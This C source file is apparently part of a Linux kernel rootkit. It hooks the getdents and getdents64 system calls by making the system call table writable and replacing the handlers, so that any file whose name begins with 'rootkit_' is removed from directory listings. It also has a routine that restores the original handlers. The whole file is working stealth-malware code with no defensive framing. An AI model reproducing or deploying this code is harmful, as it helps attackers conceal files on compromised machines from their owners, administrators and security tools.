#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/init.h>      /* Custom named entry/exit function */
#include <linux/unistd.h>    /* Original read-call */
#include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
#include <asm/pgtable_types.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <asm/uaccess.h>
#include "hide_files.h"

#include "global.h"
#include "sysmap.h"          /* Pointers to system functions */

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                       /* length is actually (d_reclen - 2 -
                          offsetof(struct linux_dirent, d_name) */
};


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
// for hooking getdents (32 and 64 bit)
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent_int)(unsigned int, struct linux_dirent __user *, unsigned int);
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, struct linux_dirent64 __user *, unsigned int);

fun_long_int_linux_dirent_int    original_getdents;
fun_long_int_linux_dirent64_int  original_getdents64;

asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
    struct linux_dirent __user *cur_dirent;
    ssize_t result;
    int bpos;
    char hidename[] = "rootkit_";
    unsigned short cur_reclen;

    OUR_TRY_MODULE_GET;

    result = original_getdents(fd, dirent, count);
    OUR_DEBUG("----------------- Here are the files ------------------------------------");
    cur_dirent = dirent;

    for (bpos=0; bpos < result;){
        cur_dirent = (struct linux_dirent*)((char *)dirent + bpos);

        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
            cur_reclen = cur_dirent->d_reclen;
            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
            result -= cur_reclen;
            //printk(KERN_INFO "new result = %d\n", result);
        } else {
            bpos += cur_dirent->d_reclen;
        }
    }

    OUR_DEBUG("----------------- End of file list ------------------------------------");
    OUR_MODULE_PUT;
    return result;

}



asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
    struct linux_dirent64 __user *cur_dirent;
    ssize_t result;
    int bpos;
    char hidename[] = "rootkit_";
    unsigned short cur_reclen;

    OUR_TRY_MODULE_GET;

    result = original_getdents64(fd, dirent, count);
    OUR_DEBUG("----------------- Here are the files ------------------------------------");
    cur_dirent = dirent;

    for (bpos=0; bpos < result;){
        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);

        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
            cur_reclen = cur_dirent->d_reclen;
            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
            result -= cur_reclen;
            //printk(KERN_INFO "new result = %d\n", result);
        } else {
            bpos += cur_dirent->d_reclen;
        }
    }

    OUR_DEBUG("----------------- End of file list ------------------------------------");
    OUR_MODULE_PUT;
    return result;



}

/* Hooks the read system call. */
void hide_files(void){
  void** sys_call_table = (void *) ptr_sys_call_table;

  // retrieve original functions
  original_getdents = sys_call_table[__NR_getdents];
  original_getdents64 = sys_call_table[__NR_getdents64];

  // remove write protection
  make_page_writable((long unsigned int) ptr_sys_call_table);

  //hook getdents
  sys_call_table[__NR_getdents] = (void*) hooked_getdents;
  sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;

  make_page_readonly((long unsigned int) ptr_sys_call_table);

}

/* Hooks the read system call. */
void unhide_files(void){
  void** sys_call_table = (void *) ptr_sys_call_table;

  make_page_writable((long unsigned int) ptr_sys_call_table);

  // here, we restore the original functions
  sys_call_table[__NR_getdents] = (void*) original_getdents;
  sys_call_table[__NR_getdents64] = (void*) original_getdents64;

  make_page_readonly((long unsigned int) ptr_sys_call_table);
}
